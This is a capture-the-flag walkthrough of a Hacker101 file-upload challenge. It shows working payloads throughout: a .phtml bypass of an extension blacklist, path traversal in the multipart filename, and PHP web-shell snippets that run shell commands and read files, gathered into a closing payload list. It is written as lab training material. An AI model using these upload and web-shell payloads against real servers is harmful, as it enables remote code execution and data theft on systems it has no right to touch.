# 🔍 Y2FuIHlvdSByZWNvbj8/ (can you recon?)

> **Platform:** Hacker101 CTF | **Difficulty:** `Moderate` | **Flags:** `3/3`

---

## Attack Chain Summary

```
File dropper page -> .php blocked -> bypass with .phtml extension
-> path traversal in filename (../hello.phtml) -> upload outside upload dir
-> inject PHP code in upload body -> RCE confirmed
-> LFI/command execution -> read flags.txt -> 3 comma-separated flags
```

---

## Application Overview

The challenge is a single-page "file dropper" — just an upload form, no other visible functionality. The name itself, `Y2FuIHlvdSByZWNvbj8/`, is Base64 for **"can you recon?"** — a hint that the real work is in exploring what the upload endpoint actually does, not what's shown on the page.

---

## Step 1 — Test the Upload

Upload any image, e.g. `milk.jpg`. Nothing special happens — file is accepted normally.

Try renaming it to `milk.php` and re-uploading:

```
Error: php files are not allowed
```

So `.php` is blocked by extension filtering.

---

## Step 2 — Bypass with .phtml

`.phtml` is a valid PHP file extension that's often missed by extension blacklists — it's still executed as PHP by Apache/PHP-FPM by default.

Rename the file to `hello.phtml` and upload. This time it's accepted.

Try accessing it directly:

```
https://LABURL/hello.phtml
```

→ **404 Not Found** — the file isn't where you'd expect.

---

## Step 3 — Path Traversal in Filename

Send the upload request to **Burp Repeater**. In the multipart body, change the filename field:

```http
Content-Disposition: form-data; name="file"; filename="../hello.phtml"
```

This places the uploaded file **one directory above** the upload folder — outside the expected web-accessible path but reachable from the root.

---

## Step 4 — Inject PHP Code

In the same Repeater request, just before the closing boundary, insert PHP code as the file body:

```
------WebKitFormBoundaryVE0XKLpD1lkWUlbo
Content-Disposition: form-data; name="file"; filename="../hello.phtml"
Content-Type: application/octet-stream

<?php echo "Hello World!"; ?>
------WebKitFormBoundaryVE0XKLpD1lkWUlbo--
```

Send it, then visit:

```
https://LABURL/hello.phtml
```

Output: `Hello World!` — **PHP code execution confirmed.**

---

## Step 5 — Escalate to Command Execution

Replace the payload with a command execution snippet:

```php
<?php
$output = [];
exec('ls', $output);
echo "<pre>" . implode("\n", $output) . "</pre>";
?>
```

Re-upload as `../hello.phtml` and visit it again. The directory listing reveals files including `flags.txt`.

---

## Step 6 — Read flags.txt (All 3 Flags)

Replace the payload to read the flags file directly:

```php
<?php
$output = [];
exec('cat flags.txt', $output);
echo "<pre>" . implode("\n", $output) . "</pre>";
?>
```

Or using `readfile`:

```php
<?php readfile('flags.txt'); ?>
```

Upload as `../hello.phtml` and visit it. The response contains all **3 flags, comma-separated** — submit each one individually to Hacker101.

---

## Why It Works

| Vulnerability | Root Cause |
|---|---|
| Extension Blacklist Bypass | Only `.php` is blocked — `.phtml` is still executed as PHP |
| Path Traversal on Upload | `filename` field in multipart upload isn't sanitized, allowing `../` to escape the upload directory |
| Arbitrary File Upload -> RCE | No content validation — uploaded file is saved and executed as-is |
| Local File Read | Once RCE is achieved, `exec()`/`readfile()` reads any file the web server user can access |

---

## Payloads

```
# Filename field - bypass + traversal
filename="../hello.phtml"

# Confirm RCE
<?php echo "Hello World!"; ?>

# List directory
<?php $o=[]; exec('ls', $o); echo "<pre>".implode("\n",$o)."</pre>"; ?>

# Read flags.txt
<?php readfile('flags.txt'); ?>
```
